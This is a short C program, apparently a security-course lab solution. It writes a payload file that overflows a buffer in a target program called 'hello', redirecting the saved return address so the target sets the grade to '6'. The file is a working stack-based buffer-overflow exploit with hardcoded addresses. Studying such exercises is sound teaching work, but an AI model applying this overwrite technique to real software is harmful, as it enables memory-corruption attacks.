#include <stdio.h>
/* Creates a 53 characters long string that once given to hello executable, 
 * it will fill the name buffer with my name, add plenty of 0 characters and 
 * then it will change the value of i variable into 56, so buff[i] will point 
 * directly to the stored return address in stack, thus once it overwrites it, 
 * the program returns to grade = '6';. */
int main(){
	int i;
	FILE *file;
	char *name = "George Manos\0";
	file = fopen("data6", "w");
	for(i = 0; i < 48; i++){
		if(i < 13)
			fputc(name[i], file);
		else 
			fputc('0', file);
	}
	fputc(56, file); /* change i so buf[i] points directly at the stored ret address */
	fputc(104, file); /* Change return address into the desired instruction */
	fputc(139, file);
	fputc(4, file);
	fputc(8, file);
	fputc(224, file); /* Also re-write the address of s so it wont be destroyed */
	fputc(101, file);
	fputc(13, file);
	fputc(8, file);
	fclose(file);
	return 0;
}
